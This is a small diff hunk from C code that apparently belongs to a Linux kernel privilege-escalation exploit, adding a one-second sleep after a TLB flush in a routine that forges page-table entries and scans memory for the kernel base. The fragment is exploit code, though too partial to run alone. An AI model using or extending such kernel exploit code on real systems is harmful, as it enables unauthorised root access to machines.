@@ -396,7 +396,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;
 
 		flush_tlb(_pmd_area, 0x400000);
-
+		sleep(1);
 		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
 		for (unsigned long long j=0; j < 512; j++) 
 		{
